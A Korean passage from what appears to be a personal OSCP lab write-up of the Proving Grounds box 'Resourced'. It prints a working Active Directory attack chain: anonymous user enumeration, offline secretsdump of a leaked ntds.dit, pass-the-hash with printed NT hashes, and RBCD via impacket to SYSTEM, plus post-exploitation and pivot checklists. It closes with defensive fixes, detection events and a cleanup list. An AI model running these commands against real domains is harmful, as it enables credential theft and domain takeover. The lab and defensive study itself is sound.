nxc smb <IP> --users | grep -iE "pass|pwd|reminder|set to"

# 2) 자격증명 검증 + 공유 + BloodHound «동시에»
nxc smb <IP> -u 'V.Ventz' -p 'HotelCalifornia194!' --shares
bloodhound-python -d resourced.local -u v.ventz -p 'HotelCalifornia194!' -ns <IP> -c all &

# 3) 공유 회수 → 오프라인 덤프
smbclient '//<IP>/Password Audit' -U 'V.Ventz%HotelCalifornia194!' -c 'recurse on; prompt off; mget *'
cp "Active Directory/ntds.dit" registry/ && cd registry
impacket-secretsdump -system SYSTEM -security SECURITY local -ntds ntds.dit | tee dump.txt

# 4) 해시 짝짓기 검증 → PtH
cut -d: -f1 dump.txt > users.txt ; cut -d: -f4 dump.txt > nt.txt
nxc smb <IP> -u users.txt -H nt.txt --no-bruteforce --continue-on-success
evil-winrm -i <IP> -u 'L.Livingstone' -H 19a3a7550ce8c505c2d46b5e39d6f808     # local.txt

# 5) RBCD 3단 → SYSTEM
impacket-addcomputer -computer-name '4Leaf$' -computer-pass 'a123a123!@' -dc-ip <IP> 'resourced.local/l.livingstone' -hashes :19a3a7550ce8c505c2d46b5e39d6f808
impacket-rbcd -delegate-from '4Leaf$' -delegate-to 'RESOURCEDC$' -action write -dc-ip <IP> 'resourced.local/l.livingstone' -hashes :19a3a7550ce8c505c2d46b5e39d6f808
impacket-getST -spn 'cifs/resourcedc.resourced.local' -impersonate Administrator -dc-ip <IP> 'resourced.local/4Leaf$:a123a123!@'
export KRB5CCNAME=$(realpath 'Administrator@cifs_resourcedc.resourced.local@RESOURCED.LOCAL.ccache') && klist
impacket-psexec -k -no-pass resourcedc.resourced.local                        # proof.txt
```

> [!warning] 위 블록은 **실행 기록이 아니라 «재구성한 절차»** 다
> 개별 명령은 전부 이 박스에서 실제로 돌아간 것이지만(§1~§4의 출처 참조), **이 순서 그대로 한 번에 돌린 세션은 존재하지 않는다.** `cut -d: -f4 dump.txt` 처럼 실제로는 다른 파일명(`hashs.txt`)으로 한 것도 있다(§3의 경고 참조).
> **출력을 붙이지 않은 이유가 그것이다** — 관측되지 않은 출력은 쓰지 않는다.

### 6-10. 셸을 잡고도 **로컬 열거를 하지 않았다**

§4-2에서 `L.Livingstone` 으로 evil-winrm 셸을 얻은 뒤, 노트에 남은 명령은 **`type ../desktop/local.txt` 하나뿐**이다. 플래그를 읽고 곧바로 나왔다.

결과적으로는 BloodHound가 답을 줬으니 손해가 없었지만, **셸을 잡으면 반사적으로 쳐야 하는 것들을 건너뛴 것**은 사실이다. 그 셸에서 다음이 나왔을 수도 있다 — 확인하지 않았으므로 **[가정]** 이다.

> [!danger] Windows 셸을 잡자마자 칠 명령 — 리눅스 반사신경이 **전부 무용지물**이다
> `sudo -l`·`find / -perm -4000`·`getcap -r /`·`crontab -l` 은 Windows에 **없다.** 대체 목록:
>
> | 리눅스 | **Windows 대응** | 무엇을 찾는가 |
> |---|---|---|
> | `id` | `whoami /all` | SID · 그룹 · **특권 목록을 한 번에** |
> | `sudo -l` | **`whoami /priv`** | `SeImpersonate`·`SeBackup`·`SeRestore`·`SeDebug`·`SeTakeOwnership` |
> | `find / -perm -4000` | `icacls "C:\Program Files\*"` · **서비스 바이너리 권한** | 쓰기 가능한 서비스 실행 파일 |
> | `crontab -l` | `schtasks /query /fo LIST /v` | 예약 작업 |
> | `netstat -tulpn` | `netstat -ano` | **로컬에만 열린 포트**(포워딩 대상) |
> | `env` | `Get-ChildItem Env:` | 자격증명이 박힌 환경변수 |
> | — | `Get-ChildItem C:\Users -Force` | **다른 사용자 프로필** |
> | — | `cmdkey /list` | **저장된 자격증명** |
> | — | `reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Winlogon` | 자동 로그인 평문 |
> | — | `Get-ChildItem -Recurse -Force -Include *.kdbx,*.config,unattend.xml,*.ps1` | 파일 안의 비밀 |
>
> **`whoami /priv` 는 Windows 박스의 «`sudo -l`»** 이다. [[Squid]]가 그 교훈이고, 이 박스에서는 치지 않았다.
> AD DC에서 특히 확인할 것: **`net group "Backup Operators" /domain`** — 멤버였다면 `SeBackupPrivilege`로 하이브를 «직접» 뜰 수 있었고([[Vault]] 경로), 공유에 백업이 없었어도 같은 결과에 도달했을 것이다.

> [!warning] **리버스셸이 안 붙으면 뭘 의심하나 — 이 박스에는 애초에 «없었다»**
> Resourced는 리버스셸도 페이로드도 쓰지 않았다. **AD 박스의 표준 전개가 그렇다** — 자격증명을 얻어 **정식 프로토콜(WinRM·SMB·RPC)로 «로그인»** 하지, 익스플로잇으로 코드 실행을 얻지 않는다.
> 그래서 **아웃바운드 방화벽·인라인 차단을 고민할 일이 없다.** 이건 큰 이점이다 — 리버스셸이 안 붙어 헤매는 시간이 통째로 사라진다.
>
> **거꾸로, AD 박스에서 «막힘»의 원인 목록도 다르다**:
> | 웹/리눅스 박스 | **AD 박스** |
> |---|---|
> | 아웃바운드 포트 차단 | **시계 오차**(`KRB_AP_ERR_SKEW`) |
> | 방화벽·WAF | **이름 해석**(FQDN vs IP, `/etc/hosts`) |
> | 페이로드 AV 탐지 | **SPN 불일치**(`KRB5CCNAME`에 원하는 티켓이 없음) |
> | 셸이 죽음(TTY 없음) | **계정 상태**(만료·잠김·비활성) |
> | 잘못된 LHOST | **박스 IP 변경**(리버트) |
>
> **§7-3의 «넷부터 확인하라»가 이 표의 요약이다.**

### 6-11. 개작 과정에서 **반증된** 서술 — 지우지 않고 남긴다

이 노트는 2026-08-20에 Kali 산출물·BloodHound JSON·도구 실측과 대조해 전면 개작됐다. **원본 노트가 틀렸던 것과 왜 틀렸는지**를 남긴다 — 같은 오해를 반복하지 않기 위해서다.

| # | 원본의 서술/표기 | 반증 | 근거 |
|---|---|---|---|
| 1 | 프론트매터 태그에 **`tech/ad/dcsync`** | **반증됨.** 이 박스에서 DCSync는 쓰지 않았다. `secretsdump`를 **`local` 모드로 오프라인 파일에** 돌렸다 | 출력에 `Using the DRSUAPI method` 줄이 **없다**. [[Hutch]]의 같은 도구 출력에는 **있다** — 두 노트를 나란히 놓으면 구분이 명확하다 |
| 2 | 프론트매터 태그에 **`tech/ad/acl-abuse`·`tech/ad/rbcd`** 만 있고 `tech/ad/delegation` 없음 | 보완했다. S4U2Self/S4U2Proxy를 실제로 수행했으므로 위임 태그가 맞다 | §4-5의 ccache가 서비스 티켓임을 `describeTicket`으로 확인 |
| 3 | `sweep.txt` 가 **무엇인지 설명 없음** | 이 파일은 **성과물이 아니라 «사용법 에러»** 다. 래퍼가 `-H`를 모른다 | 파일 내용 1줄: `Usage: nxc-sweep <IP> -u <username> -p <password> [global flags]` (§6-1) |
| 4 | `cut -d: -f1 hashes.txt > users.txt` / `cut -d: -f4 hashes.txt > nt.txt` 를 **실행 기록처럼** 배치 | Kali에 `hashes.txt`·`nt.txt` 가 **존재하지 않는다.** 실제 파일은 `users.txt`·`hashs.txt`(오타)이고, 뒤의 nxc 명령도 `hashs.txt`를 쓴다 | `ls ~/PG/Resourced/` (§3의 경고에 명시) |
| 5 | nmap IP(`192.168.125.175`)와 RBCD 구간 IP(`192.168.120.175`)가 **설명 없이 혼재** | 오타가 아니라 **리버트로 인한 IP 재배정**이다 | zsh_history 1500→1501에 옛 IP 실패 후 신 IP 재시도가 연속으로 남아 있다 (§4-4·§6-6) |
| 6 | `nxc smb --users` 가 **왜 자격증명 없이 됐는지** 설명 없음 | `Pre-Windows 2000 Compatible Access` 에 **`S-1-5-7`(ANONYMOUS LOGON)** 이 들어 있다 | `groups.json` 직접 조회 (§1-2). [[Hutch]]에는 이 SID가 **없다** — 대조군이 성립한다 |
| 7 | `STATUS_PASSWORD_EXPIRED` 다발을 **결과로만 나열** | 이것은 **해시가 «맞다»는 증거**이고, 통과한 둘은 `pwdneverexpires=true` 계정이다 | `users.json` 의 `pwdneverexpires` 속성이 정확히 두 계정에서만 `true` (§2-4) |

> [!note] 원본이 **틀리지 않았던 것**도 기록해 둔다
> 명령어 원문·해시 값·플래그 값·IP·스크린샷은 **전부 정확했다.** 산출물과 대조해 어긋난 것이 하나도 없었다.
> 개작이 바꾼 것은 **«설명»과 «분류»** 이지 «관측»이 아니다. **실측 기록은 신뢰하고, 그 위에 붙은 해석을 의심하라** — 이것이 이 볼트의 검증 원칙이다.

### 6-12. 이 박스에서 **쓰지 않은 채널** — `SYSVOL`·RID 사이클링·`--pass-pol`

익명 SMB가 곧바로 통했기 때문에 다른 열거 채널을 던져 보지 않았다. **결과적으로 필요 없었지만, 막혔다면 여기서 시작했어야 한다.**

| 안 쓴 것 | 언제 필요한가 | 명령 |
|---|---|---|
| **`rpcclient` 널 세션** | `nxc --users` 가 막혔을 때. **SAMR이 막혀도 LSARPC는 열린 경우가 있다** | `rpcclient -U '' -N <IP> -c 'enumdomusers;querydominfo'` |
| **RID 사이클링** | 위 둘이 다 막혔을 때. SID→이름 변환만으로 계정명을 얻는다 | `impacket-lookupsid '<domain>/guest'@<IP> -no-pass 20000` |
| **익명 LDAP** | SMB 쪽이 막혔을 때. **[[Hutch]]가 정확히 이 경우다** | `ldapsearch -x -H ldap://<IP> -s base namingcontexts` |
| **`--pass-pol`** | **스프레이 «전에» 항상.** 이 박스는 짝짓기 검증이라 위험이 낮았지만, 습관으로 만들 것 | `nxc smb <IP> -u U -p P --pass-pol` |
| **`SYSVOL` 정독** | 항상. `smbclient '//IP/SYSVOL'` 은 실제로 열어 봤지만(history 1386) **`cpassword` 검색은 하지 않았다** | `nxc smb <IP> -u U -p P -M gpp_password -M gpp_autologin` |
| **`enum4linux-ng -A`** | 위 전부를 한 번에 | `enum4linux-ng -A <IP>` |

> [!note] `enum4linux-ng` 는 이 Kali에 설치돼 있다 — history 1699행이 [[Vault]] 작업에서 쓴 기록이다
> 같은 세션의 다른 박스에서는 썼는데 **이 박스에서는 안 썼다.** 도구 선택이 «가진 것»이 아니라 «먼저 통한 것»에 좌우된 사례다.
> **먼저 통한 채널이 있어도, 3분짜리 광역 열거는 돌려 두는 편이 낫다** — 병렬로 돌리면 비용이 사실상 0이다.

### 6-13. 하지 않았지만 «했어야 했나» 검토한 경로

정직하게 남긴다 — **아래는 이 박스에서 실행하지 않았다.** 출력이 없는 이유다.

- **`krbtgt` 해시로 골든 티켓** — §3에서 `krbtgt:502:...:3004b16f88664fbebfcb9ed272b0565b` 를 이미 확보했다. `impacket-ticketer`로 골든 티켓을 만들면 RBCD 없이 곧바로 도메인 관리자가 된다. **RBCD보다 훨씬 짧은 경로였다.** 다만 골든 티켓은 학습 가치가 다르고(권한 «획득»이 아니라 «위조»), 탐지 관점에서도 시끄럽다. **[가정]** 실제로 통했을 것이라 보지만 확인하지 않았다
- **`Administrator` NT 해시 `12579b1666d4ac10f0f59f300776495f` 로 PtH** — §4-1에서 `STATUS_LOGON_FAILURE`가 났다. 도메인 Administrator의 비밀번호가 **백업 시점 이후에 변경됐다**는 뜻이다. `ntds.dit`는 2021-10-05의 스냅샷이므로 당연한 결과다. **"백업에서 뽑은 해시는 «백업 시점»의 것이다"** — 이게 이 실패의 교훈이다
- **`RESOURCEDC$` 머신계정 해시로 실버 티켓** — `$MACHINE.ACC`를 갖고 있었으므로 가능했다. RBCD 대신 쓸 수 있는 경로였다
- **Shadow Credentials(`AddKeyCredentialLink`)** — `GenericAll`이면 가능하지만 **ADCS가 이 도메인에 없어** PKINIT 경로가 성립하지 않는다

---

## 7. OSCP 시험 관점

### 7-1. 이 박스에서 실제로 쓴 도구의 시험 적법성

| 도구 | 판정 | 근거 |
|---|---|---|
| `nmap` (`-sCV -A`) | **허용** | 열거 도구. 대량 취약점 스캐너(Nessus/OpenVAS 등)가 아니다 |
| `netexec`/`nxc` (구 CrackMapExec) | **허용** | 열거·인증 도구. **자동 익스플로잇이 아니다** |
| `smbclient` · `ldapsearch` | **허용** | 표준 클라이언트 |
| `impacket-*` 전 계열 | **허용** | secretsdump·addcomputer·rbcd·getST·psexec 전부 |
| `BloodHound` / `bloodhound-python` | **허용** | 순수 열거·그래프 분석 |
| `evil-winrm` | **허용** | WinRM 클라이언트 |
| `rdate` | **허용** | 시각 동기 |
| **Metasploit** | **1대 한정** — 이 박스에서는 **쓰지 않았다** | `msfvenom`·`multi_handler`는 전 대상 허용이지만, 이 박스는 페이로드 자체가 필요 없었다 |
| **`sqlmap`** | **금지** — 해당 없음 | 이 박스에 웹/DB 요소가 없다 |

> [!warning] 과잉 금지 판정을 하지 마라
> BloodHound·nxc·impacket·kerbrute는 **전부 허용**이다. 규정의 금지 대상은 *"automatically discovering **and exploiting** vulnerabilities … without effort or enumeration"* 인 도구다. **열거·인증·프로토콜 클라이언트는 여기 해당하지 않는다.**

### 7-2. 이 자격증명으로 다음에 무엇을 시도하는가 — 피벗 체크리스트

시험 AD 세트는 **한 대를 뚫는 것이 아니라 도메인을 횡단하는 것**이다. 각 자격증명 획득 시점에서 **다음 수**를 번호로 고정해 둔다.

**A. 평문 비밀번호 하나를 얻었을 때** (`V.Ventz:HotelCalifornia194!`)

1. **모든 프로토콜에 그대로 던진다** — `nxc smb/winrm/rdp/ldap/mssql/ssh <IP> -u U -p P`. 서비스마다 요구 그룹이 다르므로 **하나가 막혀도 다른 게 열린다**(이 박스: SMB ○, RDP ○, WinRM ✕)
2. **공유를 전부 나열하고 READ 가능한 것은 전부 받는다** — `--shares` 후 `smbclient … -c 'recurse on; prompt off; mget *'`
3. **SYSVOL/NETLOGON을 뒤진다** — GPP `cpassword`(`Groups.xml`), 로그온 스크립트 안의 평문
4. **전 사용자에게 같은 비밀번호를 스프레이한다** — `nxc smb <IP> -u users.txt -p '<pass>' --continue-on-success` (**잠금 정책 확인 후**: `nxc smb <IP> -u U -p P --pass-pol`)
5. **BloodHound를 즉시 돌린다** — `bloodhound-python -c all`. 이후 모든 판단의 지도가 된다
6. **Kerberoast / AS-REP roast** — `impacket-GetUserSPNs -request`, `impacket-GetNPUsers`
7. **LDAP 특성 조회** — `nxc ldap -M maq`(RBCD 가능 여부) · `-M laps`(LAPS 읽기 권한) · `-M get-desc-users`(또 다른 설명 필드) · `--trusted-for-delegation`

**B. NT 해시 다발을 얻었을 때** (`hashs.txt`)

1. **`--no-bruteforce` 로 짝지어 검증한다** — 조합 스프레이는 계정을 잠근다
2. **`STATUS_PASSWORD_EXPIRED` 는 «정답» 으로 센다** — 해시가 맞다는 뜻이다. 그 계정은 **RDP로 로그인해 비밀번호를 바꾸면** 살릴 수 있다(`nla:False`면 특히 쉽다). 혹은 `smbpasswd`/`net rpc password`로 변경
3. **`DONT_EXPIRE_PASSWORD` 계정을 먼저 노린다** — LDAP 비트 필터 `(userAccountControl:1.2.840.113556.1.4.803:=65536)`
4. **WinRM을 먼저 때린다** — `nxc winrm <IP> -u U -H hash`. 되면 곧바로 대화형 셸
5. **`krbtgt`·머신계정 해시는 «최후 수단»으로 보관** — 골든/실버 티켓. 시끄럽고 되돌리기 어렵다
6. **AES 키도 챙겨 둔다** — RC4가 꺼진 도메인에서는 NT 해시가 아니라 `-aesKey`가 열쇠다

**C. 컴퓨터 객체에 대한 쓰기 권한(`GenericAll`/`GenericWrite`)을 얻었을 때**

1. **`nxc ldap -M maq` 로 MachineAccountQuota 확인** — 0이면 RBCD 경로가 막힌다
2. MAQ > 0 → **`addcomputer` → `rbcd -action write` → `getST -impersonate`** (이 박스의 경로)
3. MAQ = 0 → **이미 아는 머신계정 자격증명**을 `-delegate-from`으로 쓰거나 **Shadow Credentials**(ADCS 필요)
4. **`-spn` 은 목적에 맞춰 고른다** — `cifs/`(psexec·smbclient) · `http/`(WinRM) · `ldap/`(DCSync) · `host/`(다목적)
5. **`ldap/` SPN 티켓을 받으면 `secretsdump -k -no-pass` 로 곧장 DCSync** 가 된다. `cifs/`만 있으면 그건 안 된다 — **티켓은 SPN 단위다**
6. **끝나면 정리한다** — `impacket-rbcd -action remove`, 만든 머신계정 삭제(`addcomputer -delete`)

### 7-3. 시간 배분 — 어디서 손절했어야 하는가

| 구간 | 실제 | 적정 | 손절 기준 |
|---|---|---|---|
| nmap `-p-` | ~2분 | 2분 | — |
| 익명 열거 → description 발견 | 몇 분 | **5분** | `nxc --users` 가 되면 **설명 열을 즉시 grep**. 안 되면 다른 초기 침투를 찾아라 |
| 공유 열거 → `Password Audit` 회수 | ~2.5시간(10:42→13:21, 다른 작업 포함) | **20분** | §6-2의 인용 지옥이 여기다. **`-U 'user%pass'` 한 형식만 쓰면 5분** |
| 오프라인 secretsdump | 수 분 | 5분 | 실패하면 **하이브가 아니라 명령 문법**을 먼저 의심 |
| 해시 검증 → WinRM | ~40분(13:52→14:26) | **10분** | §6-1의 래퍼 오류. **`-h` 로 인터페이스 확인이 30초** |
| BloodHound → RBCD → SYSTEM | 3일 뒤 세션(다른 박스와 병행) | **40분** | RBCD 3단은 명령 3개다. **막히면 대개 «시계» 아니면 «이름 해석»** — 다른 데를 파지 마라 |

> [!danger] AD 박스에서 30분 이상 막혔다면 **이 넷부터 확인하라 — 취약점을 더 찾지 마라**
> 1. **시계** — `sudo rdate -n -p <DC>` 로 DC 시각과 내 시각 비교 (`KRB_AP_ERR_SKEW`)
> 2. **이름 해석** — `getent hosts <FQDN>` 이 답하는가 (`/etc/hosts`)
> 3. **`KRB5CCNAME`** — `klist` 로 **원하는 SPN의 티켓이 실제로 있는지**
> 4. **IP** — 리버트로 바뀌지 않았는가
>
> AD에서 "익스플로잇이 안 먹는다"의 **대부분은 취약점 문제가 아니라 이 넷 중 하나**다.

### 7-4. 자동 도구 없이 같은 결과를 얻는 법

| 자동 | 수동 대안 |
|---|---|
| `nxc smb --users` | `impacket-lookupsid <domain>/<user>:<pass>@<IP>` (RID 사이클링) · `enum4linux-ng -A <IP>` · `rpcclient -U '' -N <IP>` → `enumdomusers` / `queryuser 0x457` |
| `nxc-sweep` | 프로토콜별 `nxc` 개별 호출 (§1-3) |
| `bloodhound-python` | `ldapsearch`로 `nTSecurityDescriptor` 직접 조회 후 SDDL 파싱. **현실적으로 매우 비싸다** — BloodHound가 허용 도구이므로 굳이 손으로 할 이유가 없다. 다만 **한 개체의 ACL만** 보면 될 때는 `nxc ldap -M daclread` 가 가볍다 |
| `impacket-rbcd` | `bloodyAD --host <DC> -d <domain> -u U -p P add rbcd 'RESOURCEDC$' '4Leaf$'` · PowerShell(도메인 가입 호스트에서) `Set-ADComputer RESOURCEDC -PrincipalsAllowedToDelegateToAccount 4Leaf$` |
| `impacket-addcomputer` | `bloodyAD … add computer '4Leaf$' 'a123a123!@'` · `impacket-ntlmrelayx --add-computer` |
| `evil-winrm` | `impacket-wmiexec`/`smbexec`/`atexec` (같은 해시로) · Windows 호스트에서 `Enter-PSSession` |

---

## 8. 방어 관점

| # | 결함 | 조치 |
|---|---|---|
| 1 | **`description` 필드에 평문 비밀번호** (`V.Ventz`) | 이 속성은 **인증된 사용자 전원이 읽는다.** 비밀번호를 넣지 않는다. 정기적으로 감사: `Get-ADUser -Filter * -Properties Description \| Where-Object {$_.Description -match 'pass\|pwd\|!'}` |
| 2 | **`ANONYMOUS LOGON`이 `Pre-Windows 2000 Compatible Access` 에 포함** | 이 그룹에서 `S-1-5-7`을 제거한다. Windows 2000 이전 클라이언트가 없다면 그룹 자체를 비운다. `RestrictAnonymous`/`RestrictAnonymousSAM` 정책도 함께 강화 |
| 3 | **`ntds.dit` + `SYSTEM`/`SECURITY` 하이브가 SMB 공유에 방치** | **가장 치명적인 결함.** IFM 백업은 **도메인 전체의 자격증명 데이터베이스**다. 백업 매체는 오프라인·암호화 보관하고, 공유에 두어야 한다면 ACL을 백업 운영자로 한정한다. 이미 노출됐다면 **`krbtgt` 를 «두 번» 리셋**해야 한다(골든 티켓 무효화) |
| 4 | **`L.Livingstone`(일반 사용자)이 DC 컴퓨터 객체에 `GenericAll`** | 상속되지 않은 수동 ACE다. 제거한다. **DC 컴퓨터 객체의 DACL은 Domain Admins/Enterprise Admins/SYSTEM 외에 쓰기 주체가 있으면 안 된다** |
| 5 | **`MachineAccountQuota` 기본값 10** | **0으로 설정한다.** 머신계정 생성은 위임된 계정만 하도록 한다. RBCD·Shadow Credentials·noPac 계열 공격의 **공통 전제조건**을 없앤다 |
| 6 | **`DONT_EXPIRE_PASSWORD` 남용** | `L.Livingstone`·`V.Ventz`에 설정돼 있었고, 그래서 **오래된 백업의 해시가 여전히 유효**했다. 관리 계정일수록 만료 정책을 적용하고, 필요하면 gMSA로 대체 |
| 7 | **RDP에 NLA 비활성** (`nla:False`) | NLA를 켠다. 사전 인증 없이 로그온 화면에 도달하는 것을 막는다 |
| 8 | 탐지 | **이벤트 4741**(컴퓨터 계정 생성) · **4742**(컴퓨터 계정 변경 — `msDS-AllowedToActOnBehalfOfOtherIdentity` 수정이 여기 찍힌다) · **4769**(서비스 티켓 요청) 중 S4U 패턴 · **5145**(공유 개체 접근 — `Password Audit` 대량 읽기)를 감시한다 |

---

## 9. 참고 자료

- **RBCD** — [MS-SFU: S4U2Self / S4U2Proxy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/) · Elad Shamir, *"Wagging the Dog: Abusing Resource-Based Constrained Delegation"*
- **`msDS-AllowedToActOnBehalfOfOtherIdentity`** — [MS-ADA2 속성 정의](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada2/)
- **`ntds.dit` 내부 구조 / PEK** — impacket `impacket/examples/secretsdump.py` 의 `NTDSHashes` 클래스가 1차 사료다. **디스크에 있으므로 바로 읽을 수 있다**: `/usr/lib/python3/dist-packages/impacket/examples/secretsdump.py`
- **`ntdsutil` IFM** — [Microsoft: Install from Media](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/deploy/rodc/installing-ad-ds-from-media)
- **LDAP 비트 매칭 규칙** — `LDAP_MATCHING_RULE_BIT_AND` = `1.2.840.113556.1.4.803` · `BIT_OR` = `…804`
- **impacket** — https://github.com/fortra/impacket (Kali: `/usr/share/doc/python3-impacket/`)
- **BloodHound.py** — https://github.com/dirkjanm/BloodHound.py
- **OSCP 시험 규정** — [OSCP Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide) (금지 도구 정의 · "Exam Proofs")

---

## 남긴 흔적 / 정리 체크리스트

실전 침투테스트라면 반드시 되돌려야 하는 것들이다. **PG/시험에서도 리버트 없이 재현하려면 알아 둬야 한다.**

| 흔적 | 위치 | 정리 방법 |
|---|---|---|
| 머신계정 **`4Leaf$`** | AD `CN=Computers` | `impacket-addcomputer … -computer-name '4Leaf$' -delete` |
| `RESOURCEDC$` 의 **`msDS-AllowedToActOnBehalfOfOtherIdentity`** | DC 컴퓨터 객체 | `impacket-rbcd … -action remove` (또는 `flush`) |
| psexec 서비스 **`udmb`** + `ADMIN$\kEggVEPn.exe` | DC | psexec 정상 종료(`exit`) 시 자동 삭제. **강제 종료하면 남는다** — `sc delete udmb` |
| Kali 측 `/etc/hosts` 항목 | 로컬 | `sudo sed -i '/resourced.local/d' /etc/hosts` |
| ccache · `ntds.dit` 사본 | `~/PG/Resourced/` | 실전에서는 **도메인 전체 자격증명**이므로 암호화 보관 또는 파기 |

## 관련 노트

- [[Hutch]] — **짝을 이루는 박스.** 같은 Server 2019 단일 DC, 같은 "텍스트 필드에 적힌 비밀번호", 같은 "DC 컴퓨터 객체에 붙은 ACE"(거기서는 `ReadLAPSPassword`). **연달아 읽어라**
- [[Vault]] — AD 종합. `SeBackupPrivilege`로 하이브를 «직접» 뜨는 경로 · DCSync · GPO 남용
- [[Heist]] — NTLM 릴레이. 이 박스는 **SMB 서명 강제로 그 경로가 막혔다**는 대조군
- [[Nagoya]] — Kerberoast · AS-REP roast 중심의 AD. 이 박스에서 쓰지 않은 로스팅 경로를 거기서 본다
- [[Butch]] — **웹셸로 읽은 플래그는 0점**이라는 규정 원문의 출처
- [[Squid]] — Windows 반사신경(`whoami /priv`·certutil·`-enc`)의 기초
- [[_WRITEUP-STANDARD]] · [[_STATUS]]
